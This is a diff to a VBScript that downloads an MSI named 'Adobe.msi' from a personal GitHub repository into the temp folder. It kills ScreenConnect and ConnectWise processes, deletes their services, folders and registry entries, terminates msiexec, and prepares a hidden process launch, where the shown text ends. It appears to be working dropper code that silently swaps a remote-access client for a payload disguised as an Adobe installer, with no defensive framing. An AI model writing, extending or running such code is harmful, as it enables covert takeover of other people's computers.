@@ -1,14 +1,16 @@
-Dim fso, sh, http, msiUrl, msiPath, pid, wmiSvc, procClass, startup, cmdLine, procs, proc, stream
+Dim fso, sh, http, msiUrl, msiPath, pid, wmiSvc, procClass, startup, cmdLine
+Dim procs, proc, stream, svcList, svc
+
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
 msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\a.msi"
 
+' ---- 1. fetch new MSI ----
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 http.Open "GET", msiUrl, False
 http.Send
-
 If http.Status = 200 Then
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
@@ -17,18 +19,94 @@ If http.Status = 200 Then
     stream.SaveToFile msiPath, 2
     stream.Close
 End If
+If Not fso.FileExists(msiPath) Then WScript.Quit 1
 
-If Not fso.FileExists(msiPath) Then
-    WScript.Quit 1
-End If
-
+' ---- 2. kill ScreenConnect processes (name or image path) ----
 Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
+Set procs = wmiSvc.ExecQuery("SELECT ProcessId, Name, ExecutablePath FROM Win32_Process")
+For Each proc In procs
+    Dim pn, pp
+    pn = LCase(proc.Name & "")
+    pp = LCase(proc.ExecutablePath & "")
+    If InStr(pn, "screenconnect") > 0 Or InStr(pn, "connectwise") > 0 _
+       Or InStr(pp, "screenconnect") > 0 Or InStr(pp, "connectwise") > 0 Then
+        proc.Terminate
+    End If
+Next
+
+' ---- 3. stop + delete ScreenConnect services ----
+Set procs = wmiSvc.ExecQuery("SELECT Name FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR DisplayName LIKE '%ScreenConnect%' OR DisplayName LIKE '%ConnectWise%'")
+For Each svc In procs
+    sh.Run "sc.exe stop """ & svc.Name & """", 0, True
+    sh.Run "sc.exe delete """ & svc.Name & """", 0, True
+Next
+
+' ---- 4. remove ScreenConnect folders ----
+On Error Resume Next
+If fso.FolderExists("C:\Program Files (x86)\ScreenConnect Client") Then
+    fso.DeleteFolder "C:\Program Files (x86)\ScreenConnect Client", True
+End If
+If fso.FolderExists("C:\Program Files\ScreenConnect Client") Then
+    fso.DeleteFolder "C:\Program Files\ScreenConnect Client", True
+End If
+Dim pd
+pd = sh.ExpandEnvironmentStrings("%ProgramData%") & "\ScreenConnect"
+If fso.FolderExists(pd) Then fso.DeleteFolder pd, True
+On Error GoTo 0
+
+' ---- 5. remove old install registry entries ----
+On Error Resume Next
+Dim uninstKeys, subKey, shell
+Set shell = CreateObject("WScript.Shell")
+Dim hives(2)
+hives(0) = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
+hives(1) = "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"
+
+Dim i
+For i = 0 To 1
+    On Error Resume Next
+    Dim regEnum
+    Set regEnum = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    Dim names, nameArr
+    regEnum.EnumKey 2147483650, Replace(hives(i), "HKLM\", ""), names
+    If IsArray(names) Then
+        Dim n
+        For Each n In names
+            Dim dispName
+            regEnum.GetStringValue 2147483650, Replace(hives(i), "HKLM\", "") & "\" & n, "DisplayName", dispName
+            If InStr(LCase(dispName & ""), "screenconnect") > 0 Then
+                sh.RegDelete hives(i) & n & "\"
+                regEnum.DeleteKey 2147483650, Replace(hives(i), "HKLM\", "") & "\" & n
+            End If
+        Next
+    End If
+    On Error GoTo 0
+Next
+
+' also clean the Windows Installer product cache
+On Error Resume Next
+Dim wix
+Set wix = GetObject("winmgmts:\\.\root\default:StdRegProv")
+wix.EnumKey 2147483650, "SOFTWARE\Classes\Installer\Products", names
+If IsArray(names) Then
+    Dim p
+    For Each p In names
+        Dim prodName
+        wix.GetStringValue 2147483650, "SOFTWARE\Classes\Installer\Products\" & p, "ProductName", prodName
+        If InStr(LCase(prodName & ""), "screenconnect") > 0 Then
+            wix.DeleteKey 2147483650, "SOFTWARE\Classes\Installer\Products\" & p
+        End If
+    Next
+End If
+Err.Clear
+On Error GoTo 0
+
+' ---- 6. kill any msiexec and spawn fresh install ----
 Set procs = wmiSvc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
 For Each proc In procs
     proc.Terminate
 Next
 
-Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
 Set procClass = wmiSvc.Get("Win32_Process")
 Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
 startup.ShowWindow = 0
